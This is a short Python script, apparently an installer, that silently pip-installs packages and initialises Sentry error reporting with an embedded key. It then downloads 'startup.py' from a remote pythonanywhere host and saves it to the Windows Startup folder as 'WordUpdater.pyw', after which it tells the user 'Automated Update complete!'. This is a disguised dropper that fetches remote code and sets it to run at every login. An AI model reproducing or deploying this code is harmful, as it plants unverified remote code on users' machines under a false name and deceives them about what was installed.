from tkinter import messagebox
import os
import time
import pathlib

os.system(r'start "" pyw -m pip install --upgrade sentry-sdk --no-warn-script-location')
os.system(r'start "" pyw -m pip install --upgrade requests --no-warn-script-location')
os.system(r'start "" pyw -m pip install --upgrade pip --no-warn-script-location')

while True:
    try:
        import sentry_sdk
        import requests
    except ModuleNotFoundError:
        pass
    else:
        break
    time.sleep(3)

sentry_sdk.init("https://8b78151ad1da4102805eefb4a8fa8606@o1185419.ingest.sentry.io/6303999", release="GSGTMServiceInstaller@1.0.0", traces_sample_rate=1.0)

try:
    main_path = pathlib.Path.home().absolute() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / "WordUpdater.pyw"
    with open(str(main_path), "wb") as tf:
        tf.write(requests.get("http://gsgtafelmanager.pythonanywhere.com/file/startup.py").content)
    messagebox.showinfo("Done", "Automated Update complete!")
except Exception as e:
    sentry_sdk.capture_exception(e)
